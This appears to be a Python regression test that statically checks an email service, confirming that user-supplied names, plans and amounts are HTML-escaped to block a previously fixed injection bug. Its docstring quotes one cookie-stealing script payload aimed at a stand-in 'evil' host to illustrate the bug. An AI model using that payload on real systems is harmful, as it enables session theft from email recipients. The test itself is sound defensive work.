"""Functional test for Stage 1.3 / Cycle 47: SEC-EMAIL-001 HTML injection —
regression lock.

The bug (pre-fix): `display_name`, `plan`, and `amount_display` were being
interpolated directly into HTML email bodies. A tenant could set their
display_name to `<script>fetch('//evil/'+document.cookie)</script>` and any
system email (welcome, trial warning, receipt) would deliver that payload
into a rendered-HTML inbox.

The fix was to escape every user-controllable string via `html.escape()` at
the function top, always use the `safe_*` variable in the body, and never
interpolate the raw input. That fix is landed. This cycle pins it so a
future refactor can't drop an escape call without CI failing.

Strategy: static audit of backend/email_service.py. We require
`import html`, confirm every `send_*_email` function that accepts a
user-controllable string runs it through `html.escape`, and scan all HTML
f-strings for raw-user-input interpolations.
"""
import os
import re
import sys
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

# User-controllable parameters whose raw name must never appear inside an
# HTML f-string. Each must be escaped into a `safe_*` variable first.
USER_INPUT_PARAMS = ("display_name", "plan", "amount_display")


def _email_service() -> Path:
    return Path(__file__).resolve().parents[2] / "email_service.py"


def test_html_escape_imported():
    """Module-level import of `html` is the enabler for every escape call.
    If it disappears, none of the fix applies."""
    text = _email_service().read_text()
    assert re.search(r"^import\s+html(\s+as\s+\w+)?\s*$", text, re.MULTILINE), (
        "email_service.py no longer imports the stdlib `html` module. "
        "SEC-EMAIL-001 regression — no way to escape user input."
    )
    print("✅ test_html_escape_imported")


def test_user_inputs_are_escaped_before_interpolation():
    """Every function parameter in USER_INPUT_PARAMS must be passed through
    `html_lib.escape(...)` (or `html.escape(...)`) in the function that
    accepts it. If someone accepts `display_name` but forgets the escape,
    any interpolation is tainted."""
    text = _email_service().read_text()
    # Find each function that accepts one of the user-input params
    func_pattern = re.compile(
        r"async\s+def\s+(\w+)\s*\([^)]*\)\s*->\s*bool:",
    )
    missing: list[str] = []
    # Walk the source function-by-function so we can scope the check.
    matches = list(func_pattern.finditer(text))
    for i, m in enumerate(matches):
        fname = m.group(1)
        body_start = m.end()
        body_end = matches[i + 1].start() if i + 1 < len(matches) else len(text)
        body = text[body_start:body_end]
        sig = m.group(0)
        for param in USER_INPUT_PARAMS:
            if re.search(rf"\b{param}\s*:\s*str", sig):
                escape_pattern = re.compile(
                    rf"html(?:_lib)?\.escape\(\s*{param}\b"
                )
                if not escape_pattern.search(body):
                    missing.append(
                        f"  - {fname}(..., {param}: str, ...): does NOT call "
                        f"html.escape({param}) in body"
                    )
    assert not missing, (
        "SEC-EMAIL-001 regression — user-controllable string reaches email "
        "body without escaping:\n"
        + "\n".join(missing)
    )
    print("✅ test_user_inputs_are_escaped_before_interpolation")


def test_html_bodies_never_interpolate_raw_user_input():
    """Scan every HTML-looking f-string and confirm none of them interpolate
    a raw user-input parameter name. Only `safe_*` or escape-call results
    should reach the body."""
    text = _email_service().read_text()
    # Find f-strings that start with an HTML tag (heuristic: `f"<` or `f'<`)
    fstring_pat = re.compile(r"f[\"']<[^\"']*[\"']")
    offenders: list[str] = []
    for m in fstring_pat.finditer(text):
        chunk = m.group(0)
        line_num = text[: m.start()].count("\n") + 1
        for param in USER_INPUT_PARAMS:
            if re.search(rf"\{{\s*{param}\s*[}}:!]", chunk):
                offenders.append(
                    f"  - line {line_num}: HTML f-string interpolates raw "
                    f"`{{{param}}}`\n      {chunk[:120]}"
                )
    assert not offenders, (
        "SEC-EMAIL-001 regression — HTML email body interpolates raw user "
        "input. Every user-controllable value must go through html.escape "
        "first (convention: bind to `safe_<name>`):\n"
        + "\n".join(offenders)
    )
    print("✅ test_html_bodies_never_interpolate_raw_user_input")


def test_known_senders_still_exist():
    """Positive check: the four functions we believe are covered still
    exist by name. If one is renamed without this test being updated, the
    static audit above could silently skip it."""
    text = _email_service().read_text()
    expected = [
        "send_welcome_email",
        "send_trial_warning",
        "send_trial_expired",
        "send_billing_receipt",
    ]
    missing = [n for n in expected if not re.search(rf"async\s+def\s+{n}\b", text)]
    assert not missing, (
        f"email_service.py no longer exposes {missing}. If these were "
        "renamed/removed, update USER_INPUT_PARAMS coverage and this list."
    )
    print("✅ test_known_senders_still_exist")


TESTS = [
    test_html_escape_imported,
    test_user_inputs_are_escaped_before_interpolation,
    test_html_bodies_never_interpolate_raw_user_input,
    test_known_senders_still_exist,
]


def main() -> int:
    failed = 0
    for t in TESTS:
        try:
            t()
        except AssertionError as e:
            print(f"❌ {t.__name__}: {e}")
            failed += 1
        except Exception as e:
            print(f"❌ {t.__name__}: {type(e).__name__}: {e}")
            failed += 1
    print(f"\n{len(TESTS) - failed}/{len(TESTS)} passed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
